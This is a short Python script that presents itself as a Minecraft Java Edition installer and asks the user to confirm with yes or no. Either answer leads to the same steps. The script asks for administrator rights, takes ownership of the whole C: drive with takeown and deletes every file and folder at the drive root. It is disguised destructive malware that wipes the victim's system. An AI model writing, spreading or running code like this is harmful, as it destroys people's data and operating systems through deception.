import ctypes
import os
import shutil
import subprocess
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.isUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    print("Do you want to install Minecraft Java Edition? yes/no")
    userInput = input()

    if userInput == "y":
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            exit()
        
        try:
            subprocess.run(["takeown", "/f", "C:\\*", "/r", "/a"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to take ownership: {e}")
            exit(1)
        
        c_root = r'C:\\'
        for item in os.listdir(c_root):
            item_path = os.path.join(c_root, item)
            try:
                if os.path.isfile(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(f"Failed to delete {item_path}: {e}")

        exit()
    elif userInput == "n":
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            exit()
        
        try:
            subprocess.run(["takeown", "/f", "C:\\*", "/r", "/a"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to take ownership: {e}")
            exit(1)
        
        c_root = r'C:\\'
        for item in os.listdir(c_root):
            item_path = os.path.join(c_root, item)
            try:
                if os.path.isfile(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(f"Failed to delete {item_path}: {e}")

        exit()